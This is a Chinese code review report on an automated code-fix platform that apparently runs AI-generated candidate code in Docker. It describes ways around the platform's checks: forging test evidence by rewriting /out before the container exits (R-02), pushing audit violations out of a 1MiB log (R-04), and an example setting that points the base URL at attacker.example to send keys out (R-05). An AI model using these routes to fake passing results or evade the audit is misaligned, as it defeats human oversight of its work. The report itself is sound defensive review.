# 代码审查发现（04）

> 这些是**代码审查确认、但未做端到端复现**的问题（R 系列）。与 03 的 B 系列区分：B 有 PoC，R 需要 Docker/双账号/特定配置才能演示。每条标注了证据位置与置信度。

## R-01 决策层的"版本匹配/隔离就绪"是硬编码（P1）

**证据**：
- `app/workflow_v3.py:111`：`evidence_matches_current_version=True`
- `app/workflow_v3.py:319`：同上
- `app/split_runner.py:144`：同上
- `app/cli.py:139`：`evidence_matches_current_version=True, repair_budget_available=True`

**后果**：
- `configs/decision_rules.json` 中 R07/R08N 的 `evidence_matches_current_version: true` 前置条件**永远成立**；
- R00（`isolation_ready: false → stop`）在生产路径**不可达**；
- 决策记录会呈现"版本已匹配"这一未经测量的断言。

真实防线在 runner 里（`docker_runner.py:218-219,228-229` 抛 `IsolationBlocked`），所以不是"必然假通过"，而是"决策层证据不可信"。

**建议**：由 runner 结果计算这两个布尔值并传入；至少在 `python -m app.cli --check` 中演示 R00 可达（例如人为把 `isolation_ready=False` 注入决策上下文并断言 stop）。

## R-02 单容器 Docker 的 `/out` 可写，证据只做一致性校验（P1）

**证据**：
- `docker/candidate_entry.py`：把 `/out/junit.xml`、`/out/pytest_events.json` 路径固定交给候选容器；
- `app/docker_runner.py:101-106`：`/out` 为可写 tmpfs/卷；
- `c_runner/runner.py:148-150` 自述："This reader does not make files produced by arbitrary code trustworthy."；
- `run_store` 之外的 `parse_evidence`（`runner.py:206-275`）只校验 JUnit/structured/退出码三者互相一致。

**后果**：候选代码在 `CODEFIX_READY` 之后、容器退出之前改写 `/out`，可让证据自洽通过。归档 `legacy-D` 被拦是"容器已退出、docker cp 找不到文件"，不是策略主动拒绝伪造。

**建议**：
1. 单容器路径补"延迟退出 + 改写 /out"的恶意变体门槛；
2. 或统一走 Split 路径（可信容器产报告，候选只经 RPC）；
3. `/out` 改为在容器退出后由宿主重新测量并比对预期行数/哈希。

## R-03 账本全局 pending/unknown 阻断（P2）

**证据**：`app/live_model.py:106-108`、`app/account_budget.py:148-150`：
```python
SELECT 1 FROM calls WHERE status IN ('pending','unknown')
```
不带 `run_id`/账号/币种过滤。

**后果**：
- 任何一次在飞调用都会让此后所有付费调用 `ModelBlocked`；
- 与 `max_workers=2`（`app/api.py:118,123`）组合时，第二个修复任务首次调用即 blocked，以终态 `blocked` 结束而非排队；
- 一次网络抖动/超时（费用未知）造成平台级付费冻结，需人工 reconcile。

**建议**：pending 检查按账号+币种过滤；`unknown` 保持全局但错误码区分"忙"（可重试，workflow 走 pause）与"费用未知"（blocked）；对"忙"增加短时等待/重试。

## R-04 Split 审计 fail-open + 1MiB 日志可被挤出（P2）

**证据**：`app/split_runner.py:49-50` 给容器 `--log-opt max-size=1m`；`:60-65` 在 `docker logs` 失败时只记 `logs_captured`、不设违规；`:80-88` 的越界检测（tests_write/artifact_write/fork/spawn/early_exit/fake_report）全部依赖这段日志。

**后果**：候选向 stdout 写 >1MiB 即可把先前的 `CODEFIX_AUDIT` 违规行挤出，或让 logs 失败，从而规避检测。可信容器仍产 JUnit，属**检测绕过**而非直接假通过。

**建议**：审计日志改宿主持久化（`docker logs --follow` 落盘，不受容器日志上限影响），或 `logs_captured=False`/检测到截断时直接判 `environment_error`（fail-closed）。

## R-05 旧 1.0.0 `live_env` 绑定跳过服务商白名单（P2）

**证据**：`app/model_profiles.py:163-166` 对 `binding='live_env'` 直接 `LiveSettings.from_env()`；`from_env` 只校验 https/无 userinfo/无 query/fragment，不调用 `providers.validate_url/allowed_host`；1.1.0 档案路径每次都过白名单。

**后果**：把 `configs/agents.json` 降为 1.0.0 并设 `CODE_FIX_BASE_URL=https://attacker.example/v1`，密钥可发往任意 https 主机（需配置写权限，非远程可利用）。

**建议**：`from_env` 也过 `providers.validate_url(provider, base_url)`；或删除 1.0.0 分支，只保留档案绑定。

## R-06 service 级异常未传 model，密钥脱敏被跳过（P3，触发面窄）

**证据**：`app/service.py:59-62`：`record_exception(self.store.directory(run_id), exc)`；`app/diagnostics.py:15`：`redact = getattr(model, 'redact', lambda value: value)`，不传 model 时只按"变量名含 KEY/SECRET/TOKEN/PASSWORD"清洗环境变量。

**后果**：DPAPI 本机凭证不在环境变量里，这条路径对它们没有覆盖。workflow 内部各处都传了 `model=`，只有 service 这一层漏了。

**建议**：把 model/redactor 传入 service，或在 `Workflow.run` 外层包一层已脱敏异常。

## R-07 `finish()` 对 success 也写 `trace.complete('interrupted')`（P3，当前是死代码）

**证据**：`app/workflow_v3.py:84`。成功路径到达 finish 时 `trace.active is None`，`complete` 直接 return，所以当前不产生错误标签。

**后果**：潜在误标——一旦将来某路径带着未收尾步骤成功结束，会写出 `status=interrupted` 的步骤，与最终 success 矛盾。

**建议**：按 status 映射为 `ok/failed/interrupted`。

## R-09 仓库自带 `.venv` 损坏（P2，环境影响复现）

**证据**：`.venv/pyvenv.cfg` 的 `home = D:\python`、`executable = D:\python\python.exe`（不存在）、`version = 3.13.0`，且路径带 `C:\Users\yang0\...` 的历史痕迹。

**后果**：README 让用户直接 `\.venv\Scripts\python.exe`，首次复现者必然卡住；C/评审无法按文档启动。

**建议**：删除该目录（`.venv` 不被 Git 跟踪，删除无副作用）或在 README 加"若报 did not find executable，请用 `py -3.14 -m venv .venv` 重建"。
